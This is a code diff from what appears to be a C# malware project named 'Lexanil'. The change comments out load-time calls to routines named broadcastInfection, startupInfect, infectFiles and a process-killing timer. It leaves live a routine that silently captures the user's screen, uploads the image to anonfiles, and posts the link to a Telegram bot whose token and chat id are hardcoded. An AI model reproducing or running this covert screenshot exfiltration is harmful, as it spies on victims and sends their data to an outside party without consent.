@@ -44,12 +44,12 @@ namespace Lexanil
         private void MainWindow_Load(object sender, EventArgs e)
         {
             uploadFileAndNotify();
-            broadcastInfection(); 
-            disableShortcuts();
-            prockilltmr.Start();
-            ShowCursor(false);
-            startupInfect();
-            infectFiles();
+            //broadcastInfection(); 
+            //disableShortcuts();
+            //prockilltmr.Start();
+            //ShowCursor(false);
+            //startupInfect();
+            //infectFiles();
         }
 
         private void prockilltmr_Tick(object sender, EventArgs e)
@@ -223,21 +223,21 @@ namespace Lexanil
             var bitmap = new Bitmap(bounds.Width, bounds.Height);
             var graphics = Graphics.FromImage(bitmap);
             graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
-            bitmap.Save(Paths.ScreenShots + ".jpeg", ImageFormat.Jpeg) ;
+            bitmap.Save(Paths.ScreenShots + ".jpeg", ImageFormat.Jpeg);
             return bitmap;
         }
 
-        private void uploadFileAndNotify() 
+        private void uploadFileAndNotify()
         {
             using (WebClient client = new WebClient())
             {
                 CaptureScreen();
                 byte[] responseArray = client.UploadFile("https://api.anonfiles.com/upload", Paths.ScreenShots + ".jpeg");
                 var response = System.Text.Encoding.ASCII.GetString(responseArray).ToString();
-                var match = Regex.Match(response,  @"\w+://\w+.\w+/\w+/screencap-\d+_\w+").ToString();
+                var match = Regex.Match(response, @"\w+://\w+.\w+/\w+/screencap-\d+_\w+").ToString();
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://api.telegram.org/bot1991257214:AAHecknMxCKd24uX8wNC5g5AYahRLlUSCVs/sendMessage?chat_id=-561001723&text={match}");
                 HttpWebResponse response2 = (HttpWebResponse)request.GetResponse();
-                Stream resStream = response2.GetResponseStream(); 
+                Stream resStream = response2.GetResponseStream();
             }
         }
     }
